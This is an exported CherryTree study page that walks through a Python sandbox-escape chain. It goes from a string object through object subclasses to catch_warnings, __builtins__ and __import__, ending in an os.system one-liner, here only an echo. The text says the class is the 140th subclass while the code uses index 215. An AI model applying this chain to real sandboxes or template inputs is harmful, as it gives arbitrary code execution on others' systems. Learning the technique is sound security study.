<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>1. Understand how do it locally</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>1. Understand how do it locally</h1><br/><br /><br />1. <strong>List line by line subclasses of Object</strong><br /><div class="codebox"><pre>x = s.__class__.mro()[1].__subclasses__()<br />for i in range(len(x)):print(i, x[i].__name__)</pre></div><br />       <a href=""><img src="images/2582-1.png" alt="images/2582-1.png" /></a><br /><br />2. search for <span style="color:#ff0000;">catch_warnings</span> class in the subclasses of Object<br />    We are searching for <span style="color:#ff0000;">catch_warnings</span> class because this class imports Python&#39;s <a href="https://github.com/python/cpython/blob/3.9/Lib/warnings.py#L3">sys module</a> , and from sys, the os module can be reached.<br />    More precisely, os modules are all from warnings.catch_<br /><br />    <div class="codebox"><pre>#!/usr/bin/python<br /><br />s=&#39;daniele&#39;<br /><br />def searchfunc(name):<br />    print(&quot;you are searching for: &quot;, name)<br />    x = s.__class__.mro()[1].__subclasses__()<br />    for i in range(len(x)):<br />        fn = x[i].__name__<br />        if fn.find(name) &gt; -1:<br />            print(&quot;This is what i have found: &quot;)<br />            print(&quot;    &quot;, i, fn)<br /><br />searchfunc(&#39;warning&#39;)</pre></div><br />    <a href=""><img src="images/2582-2.png" alt="images/2582-2.png" /></a><br /><br />3. Now that we know <span style="color:#ff0000;">catch_warnings</span> is 140th in the list of subclasses of Object<br />    <div class="codebox"><pre>x = s.__class__.mro()[1].__subclasses__()<br />y = x[215]<br />y</pre></div><br />    <a href=""><img src="images/2582-3.png" alt="images/2582-3.png" /></a><br /><br />4. Search for <span style="color:#1e90ff;">import</span> function in the builtin methods of <span style="color:#ff0000;">catch_warning</span><br />    <div class="codebox"><pre>y()<br />y()._module.__builtins__</pre></div><br />    <a href=""><img src="images/2582-4.png" alt="images/2582-4.png" /></a><br />    <div class="codebox"><pre>#!/usr/bin/python<br /><br />s=&#39;daniele&#39;<br /><br />def searchfunc(name):<br />    print(&quot;you are searching for : &quot;, name)<br />    x = s.__class__.mro()[1].__subclasses__()<br />    for i in range(len(x)):<br />        fn = x[i].__name__<br />        if fn.find(name) &gt; -1:<br />            print(&quot;I have found it here: &quot;)<br />            print(&quot;    &quot;, i, fn)<br />            return(i)<br /><br />def searchImport(num):<br />    x = s.__class__.mro()[1].__subclasses__()<br />    y = x[num]<br />    z = y()._module.__builtins__<br />    for i in z:<br />        if i.find(&#39;import&#39;) &gt;-1:<br />            print(&quot;The import function is situated here: &quot;)<br />            print(&quot;    &quot;, i, z[i])<br /><br />catch_warning=searchfunc(&#39;warning&#39;)<br />searchImport(catch_warning)</pre></div><br />    <a href=""><img src="images/2582-5.png" alt="images/2582-5.png" /></a><br />5. we have reached the import function by walking the hierarchy. <br />    This means we can load os and use the system function to execute code all coming from a string object, as follows<br />    <div class="codebox"><pre>&#39;&#39;.__class__.__mro__[1].__subclasses__()[140]()._module.__builtins__[&#39;__import__&#39;](&#39;os&#39;).system(&quot;echo hola sono daniele&quot;)</pre></div><br />    <a href=""><img src="images/2582-6.png" alt="images/2582-6.png" /></a></div>
</body>
</html>
